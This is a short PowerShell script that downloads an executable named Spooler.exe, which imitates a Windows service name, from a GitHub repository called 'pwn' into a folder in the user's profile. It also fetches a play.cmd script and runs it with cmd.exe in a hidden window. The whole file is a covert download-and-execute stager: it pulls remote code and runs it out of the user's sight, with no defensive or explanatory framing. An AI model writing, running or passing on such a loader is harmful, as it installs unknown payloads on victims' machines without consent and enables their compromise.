# Define the download directory and executable URL
$downloadDirectory = "$env:USERPROFILE\Library"
$exeUrl = "https://github.com/Wesley5n1p35/pwn/raw/main/Spooler.exe"

# Ensure the directory exists, or create it if it doesn't
if (-not (Test-Path -Path $downloadDirectory -PathType Container)) {
    New-Item -Path $downloadDirectory -ItemType Directory
}

# Download the executable
Invoke-WebRequest -Uri $exeUrl -OutFile "$downloadDirectory\Spooler.exe"


$cmdScriptUrl = "https://raw.githubusercontent.com/Wesley5n1p35/pwn/main/play.cmd"
$cmdScriptPath = [System.IO.Path]::Combine($env:USERPROFILE, "Library\play.cmd")

# Download the .cmd script from the URL
Invoke-WebRequest -Uri $cmdScriptUrl -OutFile $cmdScriptPath

# Execute the .cmd script with the window closed
Start-Process -FilePath "cmd.exe" -ArgumentList "/c $cmdScriptPath" -WindowStyle Hidden

# Add a delay (e.g., 10 seconds) to give the CMD script time to run
Start-Sleep -Seconds 5
